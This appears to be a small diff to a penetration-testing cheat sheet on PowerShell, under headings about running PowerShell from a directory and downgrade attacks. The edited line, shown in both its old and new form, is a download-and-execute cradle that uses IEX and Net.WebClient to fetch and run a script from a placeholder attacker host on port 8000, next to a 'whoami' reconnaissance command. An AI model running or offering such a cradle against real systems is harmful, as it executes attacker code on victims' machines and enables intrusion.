@@ -2,7 +2,7 @@ Powershell run Directory
 =======================
 c:\windows\syswow64\windowspowershell\v1.0\powershell whoami
 
-c:\windows\syswow64\windowspowershell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString('http://X.X.X.X:8000/9002.ps1')"
+c:\windows\syswow64\windowspowershell\v1.0\powershell "IEX(New-Object Net.WebClient).downloadString('http://X.X.X.X:8000/9002.ps1')"
 
 PowerShell downgrade attack or create powershell 
 =================================================
